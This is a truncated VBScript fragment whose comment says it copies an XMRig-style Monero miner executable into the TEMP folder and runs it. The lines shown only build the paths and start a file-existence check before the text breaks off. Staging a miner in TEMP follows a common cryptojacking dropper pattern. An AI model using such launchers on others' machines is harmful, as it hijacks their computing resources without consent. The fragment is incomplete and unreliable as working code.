Option Explicit
' Copy XMR_Rig_6.26-DBC-75.exe from this script's own folder into TEMP and run it.
'
...
src     = fso.BuildPath(here, "XMR_Rig_6.26-DBC-75.exe")
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")
dst     = fso.BuildPath(tempDir, "XMR_Rig_6.26-DBC-75.exe")

If Not fso.FileExists(src) Then
    MsgBox "XMR_Rig_6.26-DBC-75.exe was not found next to this script:" & _
